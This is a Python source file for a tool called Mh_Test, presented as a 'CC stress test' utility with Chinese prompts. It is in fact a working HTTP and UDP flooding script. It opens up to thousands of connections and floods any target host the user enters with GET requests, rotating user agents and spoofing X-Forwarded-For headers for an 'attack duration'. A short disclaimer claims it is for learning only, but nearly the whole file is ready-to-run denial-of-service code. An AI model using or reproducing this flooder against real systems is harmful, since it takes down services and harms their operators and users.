import socket,sys,time,os
import threading as th
from random import choice,randint
from tqdm import tqdm
version,m1='b0.0.2b','(c)Copyrighgt 2025 _MhwsChina_'
useragents=[
    'Java/21.0.3',
    'Python-urllib/2.5',
    'Wget/1.9 cvs-stable (Red Hat modified)',
    'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36 Edg/137.0.0.0',
    'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
    'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
    'Baiduspider ( http://www.baidu.com/search/spider.htm)',
    'CSSCheck/1.2.2',
    'HTMLParser/1.6',
    'libwww-perl/5.820',
    'Mozilla/3.01Gold (Win95; I)',
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
    'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
    'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
    'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
    'SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0'
]
accepts=[
    'Accept: */*\r\n',
    'Accept-Encoding: gzip, deflate, br, zstd\r\n',
    'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\r\n',
    'Accept-Language: en-US,en;q=0.5\r\n'
]
lock,lock1=th.RLock(),th.RLock()
clients=[]
closed_conn=[]
cindex=0
qs,qe=0,0
def fmnum(num):
    tmp,tmp1=0,0
    for a,b in [(1000000000000,'t'),(1000000000,'bn'),(1000000,'m'),(1000,'k')]:
        if num>=a:
            tmp='%.2f'%(num/a)
            tmp1=b
            break
    if not tmp:return num
    return (tmp.replace('.00','') if tmp.endswith('.00') else tmp)+b
def getln(txt,typ=str,n=None,ls=[],err='输入不正确,请重新输入!'):
    while True:
        tmp=input(txt)
        if not tmp and n:
            return n
        if not tmp in ls and ls!=[]:
            print(err)
            continue
        try:tmp=typ(tmp);break
        except:print(err)
    return tmp
def print(*args,end=''):
    txt=' '.join(map(str,[*args]))
    l=0
    for i in txt:
        if ord(i)<=255:l+=1
        else:l+=2
    try:txt=txt+(os.get_terminal_size().columns-l)*' '
    except:txt+='\n'
    sys.stdout.write(txt+end)
def log(txt,mode='INFO',end='',start=''):
    t=time.strftime('%H:%M:%S',time.localtime(time.time()))
    print(f'{start}[{t} {mode}]: {txt}',end=end)
def getreq():
    useragent='User-Agent: '+choice(useragents)+'\r\n'
    accept=choice(accepts)
    ipr=f'{randint(0,255)}.{randint(0,255)}.{randint(0,255)}.{randint(0,255)}'
    forward='X-Forwarded-For: '+ipr+'\r\n'
    connection='Connection: Keep-Alive\r\n'
    get_host='GET'+' '+page+' HTTP/1.1\r\nHost: '+ip+'\r\n'
    req=get_host+useragent+accept+forward+connection+'\r\n'
    req=bytes(req,encoding='gbk')
    return req
class mht_TCPdefault(th.Thread):
    def __init__(self):
        th.Thread.__init__(self)
    def run(self):
        global clients,cindex,qs,qe
        c=th.current_thread().name
        req=getreq()
        while 1:
            lock.acquire()
            if cindex>=len(clients):cindex=0
            tmpa=cindex
            client=clients[tmpa]
            cindex+=1
            lock.release()
            try:
                for tmp in range(cnt):
                    client.send(req)
                    qs+=1
            except Exception as ad:
                qe+=1
                if debug:log(f'[-] @ {c} '+str(ad),mode='ERROR')
                clients[tmpa]=create_tcp_client()
class mht_UDPdefault(th.Thread):
    def __init__(self):
        th.Thread.__init__(self)
    def run(self):
        global clients,cindex,qs,qe
        c=th.current_thread().name
        req=getreq()
        while 1:
            lock.acquire()
            if cindex>=len(clients):cindex=0
            tmpa=cindex
            client=clients[tmpa]
            cindex+=1
            lock.release()
            try:
                for tmp in range(cnt):
                    client.sendto(req,(ip,port))
                    qs+=1
            except Exception as ad:
                qe+=1
                if debug:log(f'[-] @ {c} '+str(ad),mode='ERROR')
                clients[tmpa]=create_udp_client()
def create_tcp_client():
    ip1=ip.split('/')[0]
    while 1:
        try:
            temp_client=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #端口复用,防止报错
            temp_client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            temp_client.connect((ip1,port))
            return temp_client
        except:pass
def create_udp_client():
    while 1:
        try:
            temp_client=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            temp_client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            return temp_client
        except:pass
def sclient():
    global cns
    while cns:
        try:cns.pop(0)
        except:return
        if udp:clients.append(create_udp_client())
        else:clients.append(create_tcp_client())
        cbar.update(1)
log(' * Mh_Test '+version)
log(' * Code:   https://github.com/MhwsChina/Mh_Test')
log(' * Auther: _MhwsChina_')
log(' * Text:   cc压力测试工具，请勿用于非法用途，仅供学习参考',mode='WARN')
log(' * Text:   使用该工具产生的后果作者概不负责',mode='WARN')
ip=getln('IP/网址:').replace('http://','').replace('https://','')
page=ip.split('/')
page='/' if len(page)==1 else '/'+'/'.join(page[1:])
ip=ip.split('/')[0]
if ':' in ip:
    ip,port=ip.split(':')
    port=int(port)
else:
    port=getln('PORT/端口:',int,80)
cn=getln('CONNECT/连接数(10000):',int,10000)
thread=getln('THREAD/发包线程(1000):',int,1000)
cnt=getln('威力[(10=普通)(50=高)(100=极高)]:',int,100)
tm=getln('TIME/攻击持续时间:',int,60)
udp=1 if getln('是否使用UDP连接(Y/[n])',str,'n',['Y','y','N','n']).lower()=='y' else 0
log('创建连接')
cbar=tqdm(total=cn,ascii=True,dynamic_ncols=True)
if thread>cn:thread=cn
cns=list(range(cn))
t=[]
for i in range(thread):
    try:
        t1=th.Thread(target=sclient,name='create')
        t1.start()
        t.append(t1)
    except:pass
for t1 in t:t1.join()
cbar.close()
log(f'创建了{len(clients)}条连接')
lock.acquire()
log('启动线程')
for i in range(thread):
    try:
        if udp:mht_UDPdefault().start()
        else:mht_TCPdefault().start()
    except:pass
log('加载完毕')
debug=1 if getln('DEBUG MODE?(Y/[n])',str,'n',['Y','n'])=='Y' else 0
log(f'TARGET={ip}:{port},MODE={"udp" if udp else "tcp"}')
input('按下Enter开始压测')
lock.release()
qss=0
bar=tqdm(range(tm),ascii=True,dynamic_ncols=True,mininterval=0.00000000001)
for i in bar:
    time.sleep(1)
    bar.set_postfix(send=fmnum(qs),client=fmnum(len(clients)))
    qss+=qs
    qs=0
log('等待线程停止')
lock.acquire()
log('关闭连接')
clients.clear()
log('清空连接')
while clients:
    clients.clear()
    time.sleep(1)
bar.close()
log('压测完成')
log(f'压测总时长:{tm},请求数:{fmnum(qss)},线程数:{fmnum(thread)},连接数:{fmnum(cn)},请求错误次数:{fmnum(qe)}')
input('按Enter键退出...')
os._exit(0)
